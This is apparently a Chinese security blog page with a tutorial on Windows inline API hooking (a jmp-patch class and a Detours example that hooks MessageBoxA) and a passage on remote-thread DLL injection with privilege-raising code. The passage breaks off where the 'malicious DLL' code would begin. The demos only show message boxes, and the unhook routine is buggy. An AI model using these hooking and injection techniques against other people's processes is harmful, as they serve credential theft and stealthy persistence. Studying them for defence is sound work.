<p>CreateFile()是API函数，API函数也是由人编写的代码再编译而成的，也有其对应的二进制代码。既然是代码，那么就可以被修改。通过一种“野蛮”的方法来直接修改API函数在内存中的映像，从而对API函数进行HOOK。使用的方法是，直接使用汇编指令的jmp指令将其代码执行流程改变，进而执行我们的代码，这样就使原来的函数的流程改变了。执行完我们的流程以后，可以选择性地执行原来的函数，也可以不继续执行原来的函数。</p>
<p><strong>假设要对某进程的kernel32.dll的CreateFile()函数进行HOOK，首先需要在指定进程中的内存中找到CreateFile()函数的地址，然后修改CreateFile()函数的首地址的代码为jmpMyProc的指令。这样，当指定的进程调用CreateFile()函数时，就会首先跳转到我们的函数当中去执行流程，这样就完成了我们的HOOK了。</strong></p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=601a3f4ece6d400001750f38"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8bdf51f1-8df9-416e-89f8-47845d1379aa.jpeg" alt="imgbed.cn图床"></a></p>
<p>由于这种方法是在程序流程中直接进行嵌入jmp指令来改变流程的，所以就把它叫做Inline Hook。</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>Inline  Hook是在程序中嵌入了jmp指令然后跳转到我们的程序流程中继续执行的，jmp指令的用法是jmp  目的地址，减5是因为jmp xxxx指令机器码长5个字节</p>
<p><strong>jmp后的偏移量 =  目的地址  -   源地址   -  5</strong></p>
<p>目的地址：钩子函数地址  源地址：要HOOK的函数地址</p>
<p>梳理一下我们内联钩子的流程：</p>
<ul>
<li>构造jmp指令</li>
<li>在内存中找到想要HOOK的函数地址，并保存为HOOK位置处的前5个字节</li>
<li>将构造的跳转指令写入需要HOOK的位置</li>
<li>当HOOK位置被执行时会跳转到我们的执行流程</li>
<li>如果要继续原来的流程，那么取消HOOK，也就是还原被修改的字节</li>
<li>执行原来的流程</li>
<li>继续HOOK住原来的位置</li>
</ul>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>先封装一个CILHook类，</p>
<p>头文件CILHook.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CILHook</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CILHook();</span><br><span class="line">    ~CILHook();</span><br><span class="line"></span><br><span class="line">    <span class="function">BOOL <span class="title">Hook</span><span class="params">(LPCTSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">UnHook</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">BOOL <span class="title">ReHook</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    FARPROC m_pfnOrig;</span><br><span class="line">    BYTE m_bOldBytes[<span class="number">5</span>];</span><br><span class="line">    BYTE m_bNewBytes[<span class="number">5</span>];<span class="comment">//m_bNewBytes[0] = &#x27;\xe9&#x27;，为jmp的机器码，m_bNewBytes为jmp指令</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>CILHook.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;CILHook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">CILHook::CILHook()</span><br><span class="line">&#123;</span><br><span class="line">    m_pfnOrig = <span class="literal">NULL</span>;</span><br><span class="line">    ZeroMemory(m_bNewBytes, <span class="number">5</span>);</span><br><span class="line">    ZeroMemory(m_bOldBytes, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CILHook::~CILHook() &#123;</span><br><span class="line">    UnHook();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//本质就是把User32.dll中的MessageBox的地址换成钩子函数地址</span></span><br><span class="line"><span class="comment">//模块名 pszModuleName, 函数名 pszFuncName, 钩子函数 pfnHookFunc</span></span><br><span class="line"><span class="function">BOOL <span class="title">CILHook::Hook</span><span class="params">(LPCWSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc)</span> </span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="comment">//获取指定模块中函数的地址，User32.dll中的MessageBox</span></span><br><span class="line">    m_pfnOrig = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName);</span><br><span class="line">    <span class="keyword">if</span> (m_pfnOrig != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">//保存该地址处5个字节的内容到m_bOldBytes</span></span><br><span class="line">        DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">        ReadProcessMemory(GetCurrentProcess(), (LPCVOID)m_pfnOrig, m_bOldBytes, <span class="number">5</span>, &amp;dwNum);</span><br><span class="line"></span><br><span class="line">        m_bNewBytes[<span class="number">0</span>] = <span class="string">&#x27;\xe9&#x27;</span>;<span class="comment">//jmp的机器码</span></span><br><span class="line">        <span class="comment">//pfnhookfunc是HOOK后的目标地址，m_pfnOrig是原来的地址，5是指令长度</span></span><br><span class="line">        *(DWORD*)(m_bNewBytes + <span class="number">1</span>) = (DWORD)pfnHookFunc - (DWORD)m_pfnOrig - <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, <span class="number">5</span>, &amp;dwNum);</span><br><span class="line">        bRet = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解除Hook</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CILHook::UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (!m_pfnOrig != <span class="number">0</span>) &#123;</span><br><span class="line">        DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">        WriteProcessMemory(GetCurrentProcess(), m_pfnOrig, m_bNewBytes, <span class="number">5</span>, &amp;dwNum);</span><br><span class="line">        bRet = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">CILHook::ReHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (m_pfnOrig != <span class="number">0</span>) &#123;</span><br><span class="line">        DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">        WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, <span class="number">5</span>, &amp;dwNum);</span><br><span class="line">        bRet = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>主程序代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;CILHook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">CILHook MsgHook;</span><br><span class="line"></span><br><span class="line"><span class="comment">//钩子函数，弹出内容为HOOK的对话框</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyMessageBoxW</span><span class="params">(HWND hWnd,LPCWSTR lpText,LPCWSTR lpCaption,UINT uType)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MsgHook.UnHook();</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, _T(<span class="string">&quot;Hook&quot;</span>), lpCaption, uType);<span class="comment">//钩子函数弹出Hook</span></span><br><span class="line">	MsgHook.ReHook();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//hook后的MessageBox</span></span><br><span class="line">	MsgHook.Hook(_T(<span class="string">&quot;User32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>, (FARPROC)MyMessageBoxW);</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, _T(<span class="string">&quot;test&quot;</span>), _T(<span class="string">&quot;test&quot;</span>), MB_OK);<span class="comment">//如果成功，弹出的内容不是test而是Hook。</span></span><br><span class="line">	MsgHook.UnHook();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>在windows 10中测试失败，仍然执行正常的MessageBox函数，原因是windows 10操作系统中采用ASLR(地址随机化)，用公式计算出来的偏移地址是无效的，所以无法jmp到钩子函数执行。而且在多线程系统中，可能有某个线程就在这个时候调用了修改的系统函数，造成无法预期的结果。在windows 10中，可以使用微软的一个轻量级的开源库——detours来完成Hook。</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=601a3f7da9fca800016725f5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/151bc3d1-e336-4f85-b428-f454eb681d39.png" alt="imgbed.cn图床"></a></p>
<h1 id="使用detours进行API-Hook"><a href="#使用detours进行API-Hook" class="headerlink" title="使用detours进行API Hook"></a>使用detours进行API Hook</h1><p>这里可以使用微软的一个轻量级的开源库来完成Hook。Detours是微软提供的一个开发库，使用它可以简单、高效、稳定地实现API HOOK的功能。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在Visual Studio中选择<code>工具</code>-<code>&gt;NuGet包管理器</code>-&gt;<code>程序包管理器控制台</code></p>
<p>输入安装命令会自动安装Detours库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Package Detours</span><br></pre></td></tr></table></figure>



<p>导入代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;detours.h&gt;</span><br><span class="line">#pragma comment (lib,&quot;detours.lib&quot;)</span><br></pre></td></tr></table></figure>



<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib,<span class="meta-string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(WINAPI* OldMesssageBoxA)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT uType</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>= MessageBoxA;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyFunction0</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> OldMesssageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Hooked&quot;</span>, <span class="string">&quot;Warning&quot;</span>, MB_OKCANCEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach(&amp;(PVOID&amp;)OldMesssageBoxA, MyFunction0);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line"></span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, _T(<span class="string">&quot;test&quot;</span>), _T(<span class="string">&quot;test&quot;</span>), MB_OK);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h2><p>成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=601a3f75355f5d000181d33d"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/091be798-ec28-45b6-98ee-cd0af7262ba4.png" alt="imgbed.cn图床"></a></p>
<p>具体内容和利用可见</p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8E%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%87%AD%E6%8D%AE/">渗透技巧——从远程桌面客户端提取明文凭据</a></p>
<p><a target="_blank" rel="noopener" href="https://idiotc4t.com/persistence/detous-inline-hook">Detours InLine Hook</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-02T07:19:35.000Z" title="2021-02-02T07:19:35.000Z">2021-02-02</time>发表</span><span class="level-item"><time dateTime="2021-02-02T07:20:10.219Z" title="2021-02-02T07:20:10.219Z">2021-02-02</time>更新</span><span class="level-item">12 分钟读完 (大约1769个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/02/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5DLL/">远程线程注入DLL</a></h1><div class="content"><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在Windows操作系统中，每个进程的内存空间都是被隔离的，但是某些时候需要两个进程协调工作或者是跨进程操作。“远程线程”意思是跨进程，简单来说就是进程A在进程B中创建一个线程，这就叫远程线程。</p>
<p>DLL文件加载到进程的地址空间中，不会有进程名，隐蔽性较好，方法是强制让某进程加载DLL文件。只要有进程PID，先通过OpenProcess获取该进程句柄，再使用CreateRemoteThread。<strong>每个进程地址空间隔离，新创建的线程函数地址也应该在目的进程中，而不应该在本进程中，同样传递给线程函数的参数也应该在目的进程中，ThreadProc与LoadLibrary除了返回值以外基本相同，返回值的问题可以不考虑。直接把LoadLibrary函数作为线程函数创建到指定进程中。</strong></p>
<p>LoadLibrary函数在Kernerl32.dll这个系统dll中，而Kernerl32这个DLL文件在任何进程中的加载位置都相同，也就是说<strong>LoadLibrary函数的地址在任何进程中的地址都相同，因此只要在进程中获取LoadLibray函数地址后，该地址在目标进程中也可以用</strong>。使用WriteProcessMemory把要注入的DLL文件写入目标进程，该函数第二个参数需要用VirtualAllocEx在目标进程申请一块内存，然后写入dll文件路径</p>
<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>原理：先获取进程句柄（OpenProcess）-&gt;在目标进程申请一块容纳dll文件路径名的内存（VirtualAllocEx）并写入dll路径名（WriteProcessMemory）-&gt;从Kernel32.dll中获取LoadLibraryA函数的地址(GetProcAddress函数)-&gt;在目标进程中创建一个线程（CreateRemoteThread），把线程函数地址(ThreadProc)替换为从Kernel32.dll中获取的LoadLibrary地址加载恶意dll</p>
<h2 id="调整进程权限"><a href="#调整进程权限" class="headerlink" title="调整进程权限"></a>调整进程权限</h2><p>当前进程权限级别不够时，用OpenProcess()函数打开如smss.exe，winlogon.exe等系统进程时同样会失败，需要调整当前进程为”SeDebugPrivilege”权限。</p>
<p>调整权限3个步骤，调整权限使当前进程拥有”SeDebugPrivilege”权限，拥有这个权限后，当前进程可以访问一些受限的系统资源。</p>
<p>（1）使用OpenProcessToken函数打开当前进程的访问令牌</p>
<p>（2）使用LookupPrivilegeValue()函数取得描述权限的LUID</p>
<p>（3）使用AdjustTokenPrivileges()函数调整访问令牌的权限。</p>
<p>调整权限代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">AdjustProcessTokenPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LUID luidTmp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    TOKEN_PRIVILEGES tkp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))<span class="comment">//使用OpenProcessToken函数打开当前进程的访问令牌</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luidTmp))<span class="comment">//使用LookupPrivilegeValue()函数取得描述权限的LUID</span></span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = luidTmp;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))<span class="comment">//使用AdjustTokenPrivileges()函数调整访问令牌的权限。</span></span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h2><h3 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess"></a>OpenProcess</h3><p>有了进程ID后，用此函数获得进程句柄，返回值为进程的句柄，通过此句柄可结束进程</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,<span class="comment">//进程想要取得的访问权限，PROCESS_ALL_ACCESS</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL  bInheritHandle,<span class="comment">//获取的句柄是否可继承，一般FALSE</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwProcessId<span class="comment">//要打开的进程ID号</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="GetProcAddress"><a href="#GetProcAddress" class="headerlink" title="GetProcAddress"></a>GetProcAddress</h3><p>成功返回导出函数或变量的地址,失败返回NULL</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FARPROC <span class="title">GetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HMODULE hModule,<span class="comment">//LoadLibrary返回句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpProcName<span class="comment">//指定要获取函数地址的函数</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p>功能为创建远程线程，相比CreateThread多了一个hProcess参数，该参数指定要创建线程的进程句柄。CreateThread也是依赖于CreateRemoteThread，两个函数都必须传入线程函数参数（ThreadProc）。这里需要给lpStartAddress函数传入LoadLibraryA的地址替代原来调用的线程函数，LoadLibrary通过GetProcAddress函数从Kernel32.dll中获取。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE                 hProcess,<span class="comment">//OpenProcess打开的线程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T                 dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREAD_START_ROUTINE lpStartAddress,<span class="comment">//线程函数地址，传入LoadLibrary，该函数地址位于Kernel32.dll，每个进程中都固定，GetProcAddress获取</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID                 lpParameter,<span class="comment">//传给线程函数参数</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                  dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD                lpThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h3><p>在目标进程申请一块内存,返回目标进程申请到的内存块的起始地址</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hProcess,<span class="comment">//指定要申请内存的进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,<span class="comment">//指定申请的起始位置  NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,<span class="comment">//指定申请内存的长度    填入申请内存大小，为dll路径的大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flAllocationType,<span class="comment">//指定申请内存的状态类型   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flProtect<span class="comment">//指定申请内存的内存属性</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>









<h3 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h3><p>把lpBuffer中的内容写到hProcess指定进程中的lpBaseAddress，使用WriteProcessMemory把要注入的DLL文件路径写入目标进程</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE  hProcess,<span class="comment">//指定进程的进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID  lpBaseAddress,<span class="comment">//指定写入内存的起始地址，先用virtualAllocex在目标进程中申请内存，然后写入dll文件路径</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,<span class="comment">//指定写入内容的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  nSize,<span class="comment">//写入内容长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  *lpNumberOfBytesWritten<span class="comment">//接收实际写入内容长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="CloseHandle"><a href="#CloseHandle" class="headerlink" title="CloseHandle"></a>CloseHandle</h3><p>对打开的句柄进行关闭释放资源</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CloseHandle</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hObject</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>恶意dll代码，功能为弹出MessageBox</p>
